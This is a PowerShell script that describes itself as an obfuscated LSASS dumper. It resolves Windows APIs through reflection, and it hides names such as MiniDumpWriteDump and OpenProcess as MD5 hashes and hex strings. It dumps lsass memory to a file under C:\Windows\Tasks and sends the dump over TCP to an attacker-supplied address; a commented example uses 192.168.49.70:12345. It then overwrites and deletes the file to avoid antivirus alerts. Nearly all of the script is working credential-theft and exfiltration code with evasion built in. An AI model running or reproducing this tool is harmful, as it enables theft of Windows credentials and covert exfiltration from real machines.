<#
    Simple LSASS dumper powershell script that is making use of reflection, custom delegates and added obfuscation for potentially flagged strings. Obfuscation is trough simple MD5 hashes and Hex encoding for api names, methods and types.
    The dump is exfiltrated through a TCP network connection. 
    TODO: add encryption for the dump, so it can be saved on disk and also be more stealthy 
#>
$names_dict = @{
    "sys_name" = "a674ffdf2929b4677f3c47386f6b76bb"
    "libs" = @{
        "k32" = "6b,65,72,6e,65,6c,33,32,2e,64,6c,6c"
        "dbg" = "44,62,67,68,65,6c,70,2e,64,6c,6c"
    }
    "types" = @{
        "unsafe" = "f95e15be377a2ad69115238ebdaaf2eb"
        "native" = "9c1998077be57de794acb2cc817ea2c6"
        "safe" = "868253cbd4ef1c53cc94a44fc703df9b"
    }
    "apis" = @{
        "get_hand" = "7bc58a7febfd74a1356e1b559bd25ca2"
        "get_addr" = "65538bfa1e4f3a0b7edde70bcc4cbe76"
        "load" = "dedca8116e8b9f961ae535a1800d8222"
        "dump" = "4d,69,6e,69,44,75,6d,70,57,72,69,74,65,44,75,6d,70"
        "oproc" = "4f,70,65,6e,50,72,6f,63,65,73,73"
        "close" = "43,6c,6f,73,65,48,61,6e,64,6c,65"
    }
}

$global:GMH = $null
$global:GPA = $null
$global:LLB = $null


function GetMd5 {
    Param([string]$name)
    return (([System.Security.Cryptography.MD5]::Create()).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($name)) | ForEach-Object { "{0:x2}" -f $_ }) -join ""
}


function PrepareBase {
    $GPAs = @()
    [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache } | ForEach { 
        $n = GetMd5 $_.Location.Split('\\')[-1]
        if ($n -eq $names_dict["sys_name"]) {
            $_.GetTypes() | ForEach {
                $n = GetMd5 $_.FullName
                if ($n -eq $names_dict["types"]["unsafe"]) {
                    $_.GetMethods() | ForEach {
                        $h = GetMd5 $_.Name
                        if ($h -eq $names_dict["apis"]["get_hand"]) {
                            $global:GMH = $_
                        } elseif ($h -eq $names_dict["apis"]["get_addr"]) {
                            $GPAs += $_
                        }
                    }
                } elseif ($n -eq $names_dict["types"]["safe"]) {
                    $_.GetMethods() | ForEach {
                        $h = GetMd5 $_.Name
                        if ($h -eq $names_dict["apis"]["load"]) {
                            $global:LLB = $_
                        }
                    }
                }
            }
        } 
    }
    $global:GPA = $GPAs[0];
}



function PrepareAPI {
    Param(
      [IntPtr]$faddr,
      [Type]$ret_type,
      [Type[]]$arg_types
    )

    $asm = New-Object System.Reflection.AssemblyName('MyRefl')
    $domain = [AppDomain]::CurrentDomain
    $asm_build = $domain.DefineDynamicAssembly($asm, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $mod_build = $asm_build.DefineDynamicModule('MyMod', $false)
    $type_build = $mod_build.DefineType('MyDeleg', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $const_build = $type_build.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $arg_types)
    $const_build.SetImplementationFlags('Runtime, Managed')
    $method_build = $type_build.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ret_type, $arg_types)
    $method_build.SetImplementationFlags('Runtime, Managed')
    $dlg_type = $type_build.CreateType()
    $myFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($faddr, $dlg_type)
    return $myFunc
}


function ResolveAddr {
    Param([string]$lib_name, [string]$func_name)

    if ($lib_name -eq (($names_dict["libs"]["dbg"] -split "," | ForEach-Object { [char][int]"0x$_" }) -join "")) {
        Write-Host "[+] Loading the required DLL"       
        $libh = $global:LLB.Invoke($null, @((($names_dict["libs"]["dbg"] -split "," | ForEach-Object { [char][int]"0x$_" }) -join "")))

    } else {
        Write-Host "[+] Getting a handle to the module"
        $libh = $global:GMH.Invoke($null, @($lib_name))
    }
        
    try {
        $faddr = $global:GPA.Invoke($null, @($libh, $func_name))
        return $faddr
    } catch {
        $handleRef = New-Object System.Runtime.InteropServices.HandleRef -ArgumentList @($null, $libh)
        $faddr = $global:GPA.Invoke($null, @($handleRef, $func_name))
        return $faddr
    }
}


function Invoke-Dump {

    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string]$Destination
    )


    $net_addr = $Destination -split ":"

    Write-Host "[+] Obtaining references"
    PrepareBase

    Write-Host "[+] Resolving needed APIs"
    ## MiniDumpWriteDump
    $faddr = ResolveAddr `
                (($names_dict["libs"]["dbg"] -split "," | ForEach-Object { [char][int]"0x$_" }) -join "") `
                (($names_dict["apis"]["dump"] -split "," | ForEach-Object { [char][int]"0x$_" }) -join "") 
    $dumper = PrepareAPI $faddr ([bool]) @([IntPtr], [int], [IntPtr], [int], [IntPtr], [IntPtr], [IntPtr])

    ## OpenProcess
    $faddr = ResolveAddr `
                (($names_dict["libs"]["k32"] -split "," | ForEach-Object { [char][int]"0x$_" }) -join "") `
                (($names_dict["apis"]["oproc"] -split "," | ForEach-Object { [char][int]"0x$_" }) -join "") 
    $open = PrepareAPI $faddr ([IntPtr]) @([UInt32], [Boolean], [UInt32])

    ## CloseHandle
    $faddr = ResolveAddr `
                (($names_dict["libs"]["k32"] -split "," | ForEach-Object { [char][int]"0x$_" }) -join "") `
                (($names_dict["apis"]["close"] -split "," | ForEach-Object { [char][int]"0x$_" }) -join "") 
    $closer = PrepareAPI $faddr ([Boolean]) @([IntPtr])

    ## Prepare the file stream
    $filePath = "C:\Windows\Tasks\my_task.bat"
    $fileStream = [System.IO.FileStream]::new($filePath, [System.IO.FileMode]::OpenOrCreate, [System.IO.FileAccess]::ReadWrite)
    $fileHandle = $fileStream.SafeFileHandle.DangerousGetHandle()

    ## Attempt to open lsass and create minidump
    $proc = ([char]108, [char]115, [char]97, [char]115, [char]115) -join ""
    $id = (Get-Process -Name $proc | Select-Object -ExpandProperty Id)

    Write-Host "[+] PID: $id, getting handle"

    $lassy_handle = $open.Invoke(0x0400 -bor 0x0010, $false, $id)
    if ($lassy_handle -eq [IntPtr]::Zero) {
        Write-Host "[!] Could not open handle to lsass"
        return
    }
    Write-Host "[+] Handle: 0x$($lassy_handle.ToString('X'))"

    Write-Host "[+] Dumping memory"
    $res = $dumper.Invoke($lassy_handle, $id, $fileHandle, 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
    if ($res) {
        Write-Host "[+] PID: $id dumped successfully!"
    }

    Write-Host "[+] Preparing network transfer"
    $fileStream.Position = 0
    ## Copy the lsass dump to a new memory stream and convert to bytes
    $memoryStream = New-Object System.IO.MemoryStream
    $fileStream.CopyTo($memoryStream)
    $memoryStream.Position = 0

    Write-Host "[+] Transfering the dumped content to: $Destination"
    $client = New-Object System.Net.Sockets.TcpClient($net_addr[0], $net_addr[1])
    $networkStream = $client.GetStream()
    $memoryStream.CopyTo($networkStream)
    $networkStream.Close()
    $client.Close()

    Write-Host "[+] Finished, cleaning up"
    ## Overwrite the data in the stream to avoid defender alerts
    $fileStream.Seek(0, [System.IO.SeekOrigin]::Begin)
    $newData = [System.Text.Encoding]::UTF8.GetBytes("This is the new content.")
    $fileStream.Write($newData, 0, $newData.Length)
    $fileStream.SetLength($newData.Length)

    $memoryStream.Close()
    $fileStream.Close()

    $closer.Invoke($lassy_handle) | Out-Null
    Remove-Item -Path $filePath
}

#Invoke-Dump -Destination 192.168.49.70:12345
